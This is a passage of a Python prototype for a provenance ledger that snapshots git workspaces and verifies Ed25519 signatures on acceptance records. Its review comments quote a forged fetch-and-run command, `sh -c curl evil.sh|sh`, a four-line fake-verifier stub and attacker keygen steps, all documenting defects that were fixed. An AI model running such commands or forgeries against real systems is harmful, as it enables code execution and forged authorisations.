#!/usr/bin/env python3
"""OAIP prototype — Observed Action & Intent Protocol.

A minimal, RUNNABLE slice of the provenance stack we sketched:

  Observer  → capture a WORKSPACE SNAPSHOT (not HEAD) before/after an action
              via git plumbing, so history isn't polluted; compute per-file
              EFFECTS (before/after content hashes) from the two snapshots.
  Ledger    → a SQLite PROJECTION over content-addressed truth. Deletable and
              rebuildable; it stores hashes + typed relations, not canon.
  Bridge    → an accepted CLAIM becomes a real, signed Warrant record — the
              decision layer, with the provenance cited as evidence and a
              validation command as a cmd@v1 check. Warrant is a normative
              dependency, not reimplemented here.

Deliberately NOT decided here (later layers): whether the action was correct,
whether the intent was met, which policy has authority, what reaction to run.

Principles it already honors:
  * before_state is a workspace snapshot (index+worktree+untracked+env/toolchain
    fingerprint), because `before_state = HEAD` lies.
  * execution success ≠ acceptance: a claim runs a SEPARATE validation check,
    and only that gates the warrant.
  * a shell command is one EFFECT/execution kind; the model is an envelope.
  * attribution here is exclusive-window (we wrap the command) → high confidence,
    recorded as parts-per-million integers (no floats).

Usage:
  oaip.py init
  oaip.py do --intent "..." --predicate p --check "<cmd>" --actor me@host -- <command...>
  # or step by step: intent / run / claim / accept
  oaip.py log
  oaip.py verify
  oaip.py conformance [vectors.json]

Stdlib only (+ the Warrant reference CLI for the bridge). Run inside a git repo.
"""
import argparse
import contextlib
import hashlib
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import time
import uuid
from pathlib import Path

OAIP = Path(".oaip")
DB = OAIP / "ledger.db"
ART = OAIP / "artifacts"        # content-addressed artifact blobs
WSTORE = OAIP / "warrants"      # the Warrant store (canonical decision layer)
WKEY = OAIP / "dev.key"
PUBKEY = OAIP / "dev.key.pub"    # the public half, recorded by `init` from keygen
TRUST = OAIP / "trust.json"      # OAIP's keyring, in Warrant's trust-config shape
# Warrant is a normative dependency (the decision layer). Point WARRANT_CLI at
# your `warrant.py` (or an installed `warrant`); defaults to a sibling checkout.
_wcli = os.environ.get("WARRANT_CLI")
if _wcli:
    WARRANT = _wcli.split()
else:
    _cand = Path.home() / "Projects/warrant/impl/warrant.py"
    WARRANT = [sys.executable, str(_cand)]
# A sleeping Warrant CLI hung `rebuild` forever: WARRANT_CLI names an arbitrary
# program, so every call to it is bounded (2026-07-30 review, F11).
WARRANT_TIMEOUT = int(os.environ.get("OAIP_WARRANT_TIMEOUT") or 120)
VERIFY_REPORT = "warrant.verify-report@v0"
# The explicit claim→warrant link, carried in the signed `subject.note`. Matched
# CASE-INSENSITIVELY: `note.startswith("oaip-claim:")` let any writer choose the
# weaker code path by spelling it `OAIP-CLAIM:` (2026-07-30, second review round).
NOTE_PREFIX = "oaip-claim:"
STOREMETA = OAIP / "store.json"     # store-format version, written once by `init`
STORE_FORMAT = "oaip-store@v1"
LOCK = OAIP / "lock"                # serialises projection-mutating commands
UNTRUSTED = OAIP / "projection.untrusted"   # set when a rebuild REFUSED to run
try:
    import fcntl
except ImportError:                 # non-POSIX: no advisory locking available
    fcntl = None


# ---------- content-addressed helpers ----------
def sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


HEX64 = re.compile(r"^[0-9a-f]{64}$")


# ---------- Ed25519 VERIFICATION, done by OAIP itself (RFC 8032) ----------
# WHY THIS IS HERE AND NOT DELEGATED (2026-07-30, THIRD adversarial round, C2-F1a)
# --------------------------------------------------------------------------
# Until this function existed, cryptographic signature validity was decided in
# exactly ONE place: a subprocess named by `$WARRANT_CLI`, or — with no env var
# set at all — an unpinned sibling checkout at `$HOME/Projects/warrant/impl/
# warrant.py`. The gate on that subprocess checked the SHAPE of the JSON it
# printed, not the identity of the program, and OAIP's own binding rule only
# asked which key was NAMED, never whether that key had signed anything. So this
# four-line program was a complete forgery kit:
#
#     # fakewarrant.py
#     import json
#     print(json.dumps({"report": "warrant.verify-report@v0",
#                       "grade": "settlement", "ok": True, "records": 2,
#                       "errors": 0, "warnings": 0, "findings": []}))
#
# With an accept record whose `sigs[0]` NAMES this ledger's real public key and
# carries `"sig": "abab…"` (garbage — no secret needed), the real Warrant CLI
# refused (rc=1), and `WARRANT_CLI="python3 fakewarrant.py" oaip rebuild` exited
# 0, derived the acceptance edge, and `oaip log` printed "(signed decision)".
# Reproduced again with NO environment variable, by planting the same stub at
# the unpinned default path.
#
# Pinning the CLI by content hash, or challenging it with a known-bad record,
# would have narrowed that; it would not have removed it. A verifier that is a
# separate program is a verifier someone else can supply. Ed25519 VERIFICATION
# needs no secret and no dependency — it is ~60 lines of integer arithmetic over
# stdlib `hashlib` — so OAIP does it here, in process, before deriving any edge.
# OAIP stays stdlib-only (SPEC/`README`), and Warrant remains the normative
# decision layer: it is still consulted, and it can still make OAIP refuse. It
# can no longer make OAIP believe.
#
# Pinned against the RFC 8032 §7.1 test vectors and against real
# `cryptography`-produced signatures in tests/signature_gate.py.
_ED_P = (1 << 255) - 19
_ED_L = (1 << 252) + 27742317777372353535851937790883648493
_ED_D = -121665 * pow(121666, _ED_P - 2, _ED_P) % _ED_P
_ED_SQRT_M1 = pow(2, (_ED_P - 1) // 4, _ED_P)
# SPEC §5 of Warrant: small-order and non-canonically-encoded public keys are
# rejected, because such a key lets an ALL-ZERO signature verify for a large
# fraction of messages — an attacker mints a "valid signature" attributing a
# decision to any actor id without knowing a secret. Copied from Warrant's own
# list so the two implementations refuse the same keys.
_ED_SMALL_ORDER = {bytes.fromhex(h) for h in (
    "0100000000000000000000000000000000000000000000000000000000000000",
    "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a",
    "0000000000000000000000000000000000000000000000000000000000000080",
    "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05",
    "ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f",
    "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85",
    "0000000000000000000000000000000000000000000000000000000000000000",
    "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa",
    "0100000000000000000000000000000000000000000000000000000000000080",
    "ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
)}


def weak_ed25519_pubkey(raw: bytes) -> bool:
    """True for a key a conforming verifier MUST reject (Warrant SPEC §5)."""
    if len(raw) != 32 or raw in _ED_SMALL_ORDER:
        return True
    y = int.from_bytes(raw, "little") & ((1 << 255) - 1)    # drop the sign bit
    return y >= _ED_P                                        # non-canonical y


def _ed_recover_x(y, sign):
    if y >= _ED_P:
        return None                     # non-canonical encoding
    xx = (y * y - 1) * pow(_ED_D * y * y + 1, _ED_P - 2, _ED_P) % _ED_P
    x = pow(xx, (_ED_P + 3) // 8, _ED_P)
    if (x * x - xx) % _ED_P != 0:
        x = x * _ED_SQRT_M1 % _ED_P
    if (x * x - xx) % _ED_P != 0:
        return None                     # not on the curve
    if x == 0 and sign:
        return None                     # non-canonical encoding of x = 0
    return _ED_P - x if x & 1 != sign else x


def _ed_decompress(b):
    """A 32-byte little-endian point encoding → extended coordinates, or None."""
    if len(b) != 32:
        return None
    y = int.from_bytes(b, "little")
    sign, y = y >> 255, y & ((1 << 255) - 1)
    x = _ed_recover_x(y, sign)
    return None if x is None else (x, y, 1, x * y % _ED_P)


def _ed_add(P, Q):
    A = (P[1] - P[0]) * (Q[1] - Q[0]) % _ED_P
    B = (P[1] + P[0]) * (Q[1] + Q[0]) % _ED_P
    C = 2 * P[3] * Q[3] * _ED_D % _ED_P
    D = 2 * P[2] * Q[2] % _ED_P
    E, F, G, H = B - A, D - C, D + C, B + A
    return (E * F % _ED_P, G * H % _ED_P, F * G % _ED_P, E * H % _ED_P)


def _ed_mul(s, P):
    Q = (0, 1, 1, 0)
    while s > 0:
        if s & 1:
            Q = _ed_add(Q, P)
        P = _ed_add(P, P)
        s >>= 1
    return Q


_ED_GY = 4 * pow(5, _ED_P - 2, _ED_P) % _ED_P
_ED_G = (_ed_recover_x(_ED_GY, 0), _ED_GY, 1,
         _ed_recover_x(_ED_GY, 0) * _ED_GY % _ED_P)


def ed25519_verify(pub: bytes, msg: bytes, sig: bytes) -> bool:
    """RFC 8032 Ed25519 verification. Verify-only: no secret ever touches this.

    Strict in the directions that matter for a decision layer: a small-order or
    non-canonical public key is refused, `S` must be reduced (no malleability),
    and `R` must be a canonical point encoding. Refusing more than Warrant does
    can only cost OAIP an edge it would otherwise derive; accepting more could
    cost the protocol its central fact."""
    if len(pub) != 32 or len(sig) != 64 or weak_ed25519_pubkey(pub):
        return False
    A = _ed_decompress(pub)
    R = _ed_decompress(sig[:32])
    if A is None or R is None:
        return False
    S = int.from_bytes(sig[32:], "little")
    if S >= _ED_L:
        return False
    k = int.from_bytes(hashlib.sha512(sig[:32] + pub + msg).digest(),
                       "little") % _ED_L
    lhs, rhs = _ed_mul(S, _ED_G), _ed_add(R, _ed_mul(k, A))
    return ((lhs[0] * rhs[2] - rhs[0] * lhs[2]) % _ED_P == 0
            and (lhs[1] * rhs[2] - rhs[1] * lhs[2]) % _ED_P == 0)


def signature_verifies(wid: str, s) -> bool:
    """Does signature entry `s` verify over WarrantID `wid`, per OAIP itself?

    Warrant signs the RAW 32 BYTES of the WarrantID (`sk.sign(bytes.fromhex(
    wid))`, warrant.py `sign_envelope`), and the WarrantID is sha256 over the
    canonical body — which `read_warrant_store` has already recomputed from the
    file. So this check is anchored in bytes OAIP hashed itself, not in anything
    a store, an env var or a subprocess said."""
    if not isinstance(s, dict):
        return False
    key, sig = s.get("key"), s.get("sig")
    if not (isinstance(key, str) and isinstance(sig, str) and HEX64.match(wid)):
        return False
    try:
        pub, raw = bytes.fromhex(key), bytes.fromhex(sig)
    except ValueError:
        return False
    return ed25519_verify(pub, bytes.fromhex(wid), raw)


def warrant_cli_available() -> bool:
    """True when the WARRANT argv names something that can actually run.
    Mirrors tools/check.py: either the program is on PATH / at its path, and —
    for the `python3 …/warrant.py` form — the script file exists.

    NOT an identity check: `WARRANT_CLI=/usr/bin/true` satisfies this, and so
    does any stub that prints a clean report (see `store_report`). Nothing here
    or in `store_report` establishes WHICH program ran; what makes that
    survivable is that OAIP verifies signatures itself (`ed25519_verify`)."""
    prog = WARRANT[0]
    if not (shutil.which(prog) or Path(prog).exists()):
        return False
    if len(WARRANT) >= 2 and WARRANT[1].endswith(".py"):
        return Path(WARRANT[1]).is_file()
    return True


def wrun(*args):
    """The Warrant CLI, bounded in time.

    Every call is `timeout=`-bounded because WARRANT_CLI names an ARBITRARY
    program: a CLI that sleeps forever hung `oaip rebuild` forever, with no
    output and no way to tell it from slow work (2026-07-30 review, F11). A
    timeout is reported as a distinct, non-zero result — never as success."""
    try:
        return subprocess.run(WARRANT + list(args), capture_output=True,
                              text=True, timeout=WARRANT_TIMEOUT)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(
            WARRANT + list(args), 124, "",
            f"the Warrant CLI did not exit within {WARRANT_TIMEOUT}s "
            "(OAIP_WARRANT_TIMEOUT)")
    except OSError as e:
        return subprocess.CompletedProcess(WARRANT + list(args), 127, "",
                                           f"cannot run the Warrant CLI: {e}")


# ---------- OAIP's keyring (key↔actor binding) ----------
# WHY OAIP OWNS THIS, AND WHY IT IS NOT WARRANT'S JOB
# --------------------------------------------------
# Warrant SPEC §5: "Key↔actor binding is out of scope for v0.1 (use your existing
# PKI/keyring); implementations MUST verify signatures against the stated key and
# report the binding as unverified if no keyring is configured." §5.1 adds:
# "Bound/unbound is a report unless a v0.3 policy explicitly makes bound
# signatures required", and "No interchangeable keyring file format is mandated."
#
# So `warrant verify` CANNOT be configured to fail on an unbound signature, and
# it exits 0 for a store whose only record is signed by a freshly generated key
# claiming any actor id it likes. Measured on this branch before this change:
#   warrant keygen --out attacker.key
#   warrant --store .oaip/warrants accept … --note oaip-claim:<cid> \
#           --actor tester@local --key attacker.key
#   -> warrant verify: 0 errors, 1 warning ("binding unverified (no keyring)")
#   -> oaip rebuild:  warrant=1
#   -> oaip log:      WARRANT 41d32da62a81…  (signed decision)
# for a claim NOBODY accepted. The protocol's central fact, forged for free.
#
# Warrant's own settlement grade (`verify --settlement --trust-config`) DOES
# compute bound/unbound against a pinned keyring, and OAIP corroborates with it
# (see `unbound_by_warrant`) — but two properties make it insufficient alone:
# it is a WARN by specification, and its machine-readable
# `warrant.verify-report@v0` omits the finding entirely in quiet mode (the
# emitting branch is `if quiet: pass`), so the JSON an integrator is told to
# consume reports 0 errors and no binding finding for an unbound signer.
# Therefore the ENFORCED rule is OAIP's own, over OAIP's own keyring.
def note_convention_since():
    """The ts from which a missing `oaip-claim:` note is a DEFECT, not history.

    Returns an int, or None when this store predates the store-format marker
    entirely (in which case any of its records may genuinely be legacy).

    WHY A STORE-FORMAT VERSION AND NOT A PROPERTY OF THE RECORD (F8, 2026-07-30,
    second review round). Rebuild routed accepts without the note to a
    subject-hash fallback and called those records "legacy" — but "has no note"
    is a property the WRITER chooses. Omitting the note (or spelling the prefix
    `OAIP-CLAIM:`) selected the weaker path on demand, in a brand-new store,
    fanning one warrant onto every claim with a colliding subject. Reproduced
    here: two direct filings, one with no note and one with a case-variant
    prefix, both took the fallback and both produced an edge, `oaip verify`
    reporting 0 errors.

    So the criterion is one the writer cannot choose: `init` stamps
    `.oaip/store.json` with the moment this store began requiring the note. A
    record filed after that had every opportunity to carry the link, so a missing
    link is a defect in the filer, and no edge is derived — not even with
    --allow-legacy-links. Only a store with NO marker (created before OAIP
    stamped one) can contain genuinely legacy records, and even there the
    fallback stays off until the operator asks for it in as many words."""
    if not STOREMETA.is_file():
        return None
    try:
        meta = loads_ijson(STOREMETA.read_bytes())
        ts = meta.get("note_convention_since")
        return ts if isinstance(ts, int) and not isinstance(ts, bool) else None
    except (ValueError, OSError):
        return None


def ensure_trust():
    """OAIP's keyring must exist before anything verifies: a missing trust config
    makes Warrant's settlement preflight fail closed, and an empty one is the
    honest starting point (no actor is bound until OAIP binds it)."""
    OAIP.mkdir(exist_ok=True)
    if not TRUST.is_file():
        TRUST.write_text(json.dumps({"actors": {}}, sort_keys=True) + "\n")


def read_trust():
    """(actors, error). `actors` maps actor id → list of hex64 public keys.

    Deliberately in Warrant's trust-config shape (`{"actors": {...}}`, the closed
    schema its `--trust-config` validates) so the SAME file can be handed to
    Warrant's settlement grade; OAIP does not invent a second format."""
    if not TRUST.is_file():
        return {}, None
    try:
        doc = loads_ijson(TRUST.read_bytes())
    except (ValueError, OSError) as e:
        return None, f"{TRUST}: unreadable keyring: {e}"
    if not isinstance(doc, dict) or not isinstance(doc.get("actors", {}), dict):
        return None, f"{TRUST}: not a keyring ({{\"actors\": {{...}}}} expected)"
    actors = {}
    for a, keys in doc["actors"].items() if doc.get("actors") else []:
        if not (isinstance(keys, list) and all(isinstance(k, str) and HEX64.match(k)
                                               for k in keys)):
            return None, f"{TRUST}: actor {a!r} has a malformed key list"
        actors[a] = list(keys)
    return actors, None


def bind_actor(actor: str, key: str):
    """Record that `key` may sign as `actor`. Called only by `cmd_accept`, only
    for the key `.oaip/dev.key` — the key THIS ledger generated and custodies —
    so an attacker's key is never written here by any OAIP code path."""
    ensure_trust()
    actors, err = read_trust()
    if err:
        sys.exit(f"refusing to file an acceptance: {err}")
    if key in actors.get(actor, []):
        return
    actors.setdefault(actor, []).append(key)
    TRUST.write_text(json.dumps({"actors": actors}, sort_keys=True) + "\n")


def accepting_signature(wid, env, actors):
    """Does a VALID, BOUND signature by the actor this record NAMES stand on it?

    Returns (refusal_or_None, notes, key, actor). `notes` are informational: they
    describe the OTHER signature entries, which are reported and never fatal.

    WHY "THE NAMED ACTOR'S", NOT "ALL OF THEM" (2026-07-30, third adversarial
    round, C2-F1b). This function used to demand that EVERY signature entry be
    bound, reasoning that a bound-but-invalid entry could stand next to an
    unbound-but-valid one. Now that OAIP verifies each signature itself that
    reasoning is gone, and what the rule actually did was hand a deletion primitive
    to anyone with store write access: Warrant SPEC §5 explicitly permits appending
    a co-signature, and deliberately will not let a junk one invalidate a good
    record (a griefing/availability vector). Measured before this change: ONE
    cryptographically VALID co-signature by `cosigner@other`, appended to an honest
    accept, left `warrant verify` at 0 errors and made `oaip rebuild` print
    `warrant=0` and exit 0 — the acceptance edge silently deleted by a
    Warrant-sanctioned operation, and a legitimate second endorser could not be
    expressed at all.

    So the question is the one OAIP actually needs answered: did the actor this
    record names sign it, with a key this ledger binds to that actor? Extra
    signatures endorse; they do not decide, and they cannot un-decide."""
    body = env.get("body") if isinstance(env, dict) else None
    actor = body.get("actor") if isinstance(body, dict) else None
    claimed = actor.get("id") if isinstance(actor, dict) else None
    if not (isinstance(claimed, str) and claimed):
        return ("the record names no actor (body.actor.id), so no signature on "
                "it can be anyone's decision"), [], None, None
    sigs = env.get("sigs")
    if not isinstance(sigs, list) or not sigs:
        return "the record carries no signatures", [], None, claimed
    notes, by_claimed = [], []
    for s in sigs:
        if not isinstance(s, dict):
            notes.append("a signature entry is not an object (ignored)")
            continue
        a, k = s.get("actor"), s.get("key")
        if not (isinstance(a, str) and isinstance(k, str)):
            notes.append("a signature entry has no actor/key strings (ignored)")
            continue
        valid, bound = signature_verifies(wid, s), k in actors.get(a, [])
        if a == claimed:
            by_claimed.append((valid, bound, k))
            if valid and bound:
                continue                    # this is the decision itself
        if not valid:
            notes.append(f"a signature by {a!r} does not verify and is EXCLUDED "
                         "(Warrant SPEC §5 permits appended co-signatures; a junk "
                         "one must not invalidate a good record)")
        elif not bound:
            notes.append(f"a VALID co-signature by {a!r} (key {k[:12]}) is not "
                         f"bound in {TRUST} — recorded, but it endorses rather "
                         "than decides")
        else:
            notes.append(f"a VALID, bound co-signature by {a!r} (key {k[:12]})")
    for valid, bound, k in by_claimed:
        if valid and bound:
            return None, notes, k, claimed
    if not by_claimed:
        return (f"no signature entry claims the actor this record names "
                f"({claimed!r})"), notes, None, claimed
    valid_key = next((k for valid, _, k in by_claimed if valid), None)
    if valid_key is not None:
        return (f"key {valid_key[:12]} is not bound to actor {claimed!r} in "
                f"{TRUST}"), notes, valid_key, claimed
    return (f"the signature by {claimed!r} does NOT verify against key "
            f"{by_claimed[0][2][:12]} (OAIP's own Ed25519 check)"), \
        notes, by_claimed[0][2], claimed


def store_report(settlement=True):
    """(report, error) — the Warrant CLI's `warrant.verify-report@v0` object.

    WHAT THIS IS, AND WHAT IT IS NOT. It is a SHAPE check on a JSON document, and
    a commit on this branch wrongly called it "the CLI identity probe" — a claim
    the third adversarial round refuted in four lines (see `ed25519_verify`): a
    stub that prints a well-formed clean report satisfies it completely. The
    honest description is narrower. `WARRANT_CLI=/usr/bin/true` exits 0 having
    verified nothing, and OAIP must not read an exit status as a verification, so
    a program that cannot even produce a parseable `warrant.verify-report@v0` is
    refused (F9). That rules out an *accident* — a mis-set variable, a wrapper
    that swallows output — not an adversary.

    What makes an adversary's stub useless is that OAIP no longer BELIEVES this
    report about signatures: `accepting_signature` verifies Ed25519 in
    process. This report can still make OAIP REFUSE (errors here are fatal to a
    rebuild), which is the safe direction for a delegated check."""
    if not warrant_cli_available():
        return None, ("no runnable Warrant CLI is configured (set WARRANT_CLI) "
                      "— refusing to reason about signatures nothing verified")
    ensure_trust()
    argv = ["--store", str(WSTORE), "verify", "--store-mode", "--json"]
    if settlement:
        argv += ["--settlement", "--trust-config", str(TRUST)]
    r = wrun(*argv)
    try:
        doc = json.loads(r.stdout)
    except ValueError:
        tail = (r.stdout + r.stderr).strip().splitlines()
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) did not "
                      f"emit a {VERIFY_REPORT} object (exit {r.returncode}) — an "
                      "exit status is not a verification"
                      + (f": {tail[-1][:120]}" if tail else ""))
    if not (isinstance(doc, dict) and doc.get("report") == VERIFY_REPORT
            and isinstance(doc.get("errors"), int)
            and isinstance(doc.get("warnings"), int)
            and isinstance(doc.get("findings"), list)):
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) emitted "
                      f"JSON that is not a {VERIFY_REPORT}")
    return doc, None


def findings_by_record(report):
    """subject → [messages], for the per-record half of a verify report."""
    out = {}
    for f in report.get("findings", []):
        if isinstance(f, dict) and isinstance(f.get("subject"), str):
            out.setdefault(f["subject"], []).append(str(f.get("message", "")))
    return out


# Findings that say Warrant excluded or could not read A signature on a record.
# They are NOT fatal here: Warrant reports them and carries on, correctly (§5
# lets anyone with store write access append a co-signature, so a junk one must
# not invalidate a good record), and OAIP now verifies each signature itself, so
# it can say WHICH entry was junk instead of losing track of all of them.
_AMBIGUOUS_SIG = ("does not verify", "is not an object", "no signatures",
                  "sigs must be a list")

# `WARN <wid12>  signature unbound: key <key12> claims actor <id>` — warrant.py's
# own text rendering (`print(f"{level:4} {wid[:12]}  {msg}")`).
_UNBOUND_LINE = re.compile(
    r"^WARN\s+(\S+)\s+(?:signature unbound|binding unverified \(no keyring\)): "
    r"key (\S+) claims actor (.*)$")


def unbound_by_warrant():
    """Warrant's OWN bound/unbound determination, as corroboration.

    `verify --settlement --trust-config` reports `signature unbound` / `binding
    unverified` in its human report against the same keyring file OAIP writes.
    It is read from the TEXT output because the machine-readable report drops the
    finding in quiet mode (`if quiet: pass` in warrant.py's emitting branch), so
    the JSON cannot carry it.

    Returns a set of (WarrantID prefix, key prefix, actor) triples — PER
    SIGNATURE, not per record. Per record was a second way an appended co-sig
    deleted an acceptance edge (C2-F1b): one unbound co-signature flagged the
    whole record, so the corroboration refused a record whose named actor had
    signed it perfectly well. An unreadable run returns None, which callers must
    treat as "no corroboration", never as "clean" — the enforced check is
    `accepting_signature`."""
    ensure_trust()
    r = wrun("--store", str(WSTORE), "verify", "--settlement",
             "--trust-config", str(TRUST))
    if r.returncode not in (0, 1):
        return None
    flagged = set()
    for line in (r.stdout + r.stderr).splitlines():
        m = _UNBOUND_LINE.match(line.strip())
        if m:
            flagged.add((m.group(1), m.group(2), m.group(3).strip()))
    return flagged


# ---------- strict I-JSON ingestion (SPEC §1) ----------
# §1 says every OAIP record is canonical I-JSON "exactly per Warrant SPEC §4".
# Serialising canonically is only half of that: the other half is REFUSING input
# outside the domain, and until 2026-07-30 nothing here refused anything —
# `json.loads` was called bare on every artifact read. Stock Python accepts
# duplicate member names (last-wins), NaN/Infinity, and lone surrogates; Warrant
# rejects all three, and Go's decoder disagrees with Python on the last two. So
# the same bytes would parse to different records in different implementations
# while the SPEC claimed one domain. These are reimplemented rather than imported
# from Warrant so OAIP stands alone as an implementation — and
# `tests/ijson_parity.py` pins them against Warrant's so the copy cannot drift.
def _reject_dup_keys(pairs):
    d = {}
    for k, v in pairs:
        if k in d:
            raise ValueError(f"duplicate member name: {k}")
        d[k] = v
    return d


def _reject_constant(sym):
    raise ValueError(f"invalid I-JSON constant: {sym}")


def _reject_lone_surrogates(obj):
    """RFC 7493: every string is valid Unicode. Python keeps a `\\ud800` escape as
    a surrogate code point; Go substitutes U+FFFD — the same bytes, two different
    strings, two different hashes."""
    if isinstance(obj, str):
        for ch in obj:
            if 0xD800 <= ord(ch) <= 0xDFFF:
                raise ValueError("lone surrogate in string (invalid I-JSON)")
    elif isinstance(obj, dict):
        for k, v in obj.items():
            _reject_lone_surrogates(k)
            _reject_lone_surrogates(v)
    elif isinstance(obj, list):
        for v in obj:
            _reject_lone_surrogates(v)
    return obj


def _reject_floats(obj, path="$"):
    """§1: "integers only (no floats anywhere)". Warrant enforces this per typed
    field in `validate_body`; OAIP had no schema layer at all, so it is enforced
    here at the domain boundary — a float `ts` or a fractional `confidence_ppm`
    is outside the format, not a value to round."""
    if isinstance(obj, float):
        raise ValueError(f"float at {path}: SPEC §1 permits integers only")
    if isinstance(obj, dict):
        for k, v in obj.items():
            _reject_floats(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _reject_floats(v, f"{path}[{i}]")
    return obj


def loads_ijson(raw):
    """`json.loads` restricted to the domain SPEC §1 actually declares.

    The BOM case is a deliberate narrowing, not a grammar violation: RFC 8259 §8.1
    lets a receiver ignore a leading byte order mark, and "MAY" is unaffordable in
    a content-addressed format — the same record would arrive as two byte strings
    with two different addresses. Measured: Python's `json.loads` strips a BOM from
    BYTES and returns the record, Go's `encoding/json` rejects it. This mattered
    here and not in Warrant: `read_artifact` passes raw bytes, so the BOM was
    genuinely accepted, whereas every Warrant call site passes a `str`, where
    `json.loads` already fails. The reject vector recorded it as
    "ACCEPTED — must be refused" before this line existed."""
    bom = b"\xef\xbb\xbf" if isinstance(raw, (bytes, bytearray)) else "﻿"
    if raw[:len(bom)] == bom:
        raise ValueError("leading byte order mark (not canonical I-JSON)")
    return _reject_floats(_reject_lone_surrogates(
        json.loads(raw, object_pairs_hook=_reject_dup_keys,
                   parse_constant=_reject_constant)))


def read_artifact(path: Path):
    """Load an artifact, refusing bytes that do not hash to their own address.

    THE DEFECT THIS CLOSES (found 2026-07-30)
    -----------------------------------------
    `.oaip/artifacts` IS the canonical layer: SPEC §5 ends "the projection is
    disposable; the content-addressed causal graph is the truth." Every reader
    used bare `json.loads(path.read_bytes())` and never recomputed the address,
    so editing a file in place silently rewrote the truth. Demonstrated: an
    execution record's `command` was changed to `sh -c curl evil.sh|sh`,
    `rebuild` reported success, and the projection asserted the forged command
    while the file still sat under its original name. Content-addressed storage
    whose reader never checks the address is not content-addressed; it is a
    directory of files with long names.

    Returns (doc, error). `doc` is None when the artifact must not be used.

    A DIRECTORY at an artifact's address is not an artifact: `read_bytes()` raised
    IsADirectoryError and the traceback replaced every diagnosis this function
    exists to give (F12, 2026-07-30). Any OSError is reported as what it is — an
    unreadable path — because "the canonical layer contains something that is not
    a file" is a real state of the world, and a refusal is a decision while a
    traceback is an accident.
    """
    try:
        raw = path.read_bytes()
    except OSError as e:
        kind = "a directory" if path.is_dir() else "unreadable"
        return None, (f"{path.name[:12]}: {kind} at an artifact address "
                      f"({type(e).__name__}) — not an artifact")
    if path.name != sha256(raw):
        return None, (f"{path.name[:12]}: bytes hash to {sha256(raw)[:12]} — "
                      "artifact does not match its own address")
    try:
        doc = loads_ijson(raw)
    except json.JSONDecodeError:
        # A transcript or a plain blob, not a record. Must be caught BEFORE
        # ValueError: JSONDecodeError subclasses it, so the wider clause first
        # would report every non-JSON artifact as a canonicalization failure.
        return None, None
    except ValueError as e:
        return None, f"{path.name[:12]}: not canonical I-JSON: {e}"
    return doc, None


def canon(obj) -> bytes:
    """RFC 8785 (JCS) I-JSON, EXACTLY per Warrant SPEC §4 (SPEC §1): sorted keys,
    compact separators, UTF-8, integers only, raw non-ASCII (ensure_ascii=False).
    A record's identity is SHA-256 of these bytes; every OAIP implementation MUST
    agree on them, so this must match Warrant's canonicalization byte-for-byte."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def put_artifact(data: bytes, kind: str) -> str:
    ART.mkdir(parents=True, exist_ok=True)
    h = sha256(data)
    p = ART / h
    if not p.exists():
        p.write_bytes(data)
    con = db()
    con.execute("INSERT OR IGNORE INTO artifacts(hash, kind, size) VALUES (?,?,?)",
                (h, kind, len(data)))
    con.commit()
    return h


def kid() -> str:
    # time-sortable-ish id (uuid7 not in stdlib; use ts + short uuid)
    return f"{int(time.time()*1000):013d}-{uuid.uuid4().hex[:8]}"


# ---------- git plumbing: the workspace snapshot ----------
def git(*args, **kw) -> str:
    r = subprocess.run(["git", *args], capture_output=True, text=True, **kw)
    if r.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)}: {r.stderr.strip()}")
    return r.stdout.strip()


def symlinked_ledger_target():
    """The repo-relative path `.oaip` points at, when `.oaip` is a SYMLINK.

    THE DEFECT THIS CLOSES (F6, 2026-07-30, second adversarial round). The ledger
    exclusion is by NAME, and a symlink gives the same directory a second name:
    `ln -s ledgerstore .oaip` made `git add -A` add the REAL path, which
    `**/.oaip/**` does not match. Measured before this: the snapshot tree carried
    `ledgerstore/dev.key`, `ledgerstore/ledger.db`, `ledgerstore/trust.json`,
    `ledgerstore/tmp.index` and the key's blob was in `.git/objects` — the whole
    original leak, one `ln -s` away. `oaip init` refuses to run into a symlinked
    ledger, but a symlink can be made afterwards, so the snapshot must not depend
    on init having refused.

    Returns None when `.oaip` is not a symlink, or when the target lies outside
    the repository (where `git add` would not have added it anyway)."""
    if not OAIP.is_symlink():
        return None
    try:
        top = Path(git("rev-parse", "--show-toplevel")).resolve()
        return OAIP.resolve().relative_to(top).as_posix()
    except (RuntimeError, ValueError, OSError):
        return None


def workspace_snapshot() -> str:
    """Content-addressed tree of the FULL worktree (tracked + staged + untracked),
    built in a throwaway index so `git log` is never touched. This is the honest
    `before_state`/`after_state`, unlike HEAD.

    `.oaip/` is NEVER part of the snapshot. Until 2026-07-30 it was: `git add -A`
    into the throwaway index wrote `.oaip/dev.key` — the Ed25519 SIGNING KEY —
    as a loose blob into `.git/objects` of any repo whose .gitignore did not
    already exclude `.oaip/` (a fresh `git init` + `oaip init` was enough).
    A throwaway index does not mean throwaway objects: `git add` writes blobs
    to the object database, where they sit recoverable by hash and travel with
    any clone/push that reaches them. The observer must not exfiltrate its own
    key custody into the thing it observes; nor is the ledger/store part of the
    observed workspace — a snapshot that contains the observation machinery
    changes whenever the machinery does, which is the observer effect, not
    provenance. The exclusion is done here with a pathspec (not .gitignore) so
    it does not depend on user configuration.

    The pathspecs are REPO-ROOTED, DEPTH-AGNOSTIC and CASE-INSENSITIVE, and all
    three properties are load-bearing (2026-07-30 adversarial review, two rounds,
    fresh-context Claude-family reviewer — every hole reproduced):
      * The first fix used `-- . ':(exclude).oaip'`. `:(exclude).oaip` anchors
        at the pathspec root, so a NESTED ledger (`sub/.oaip/dev.key`, from an
        `oaip init` run in a subdirectory) still landed in `.git/objects` —
        the same key leak, one directory down. `:(top,exclude,glob)**/.oaip/**`
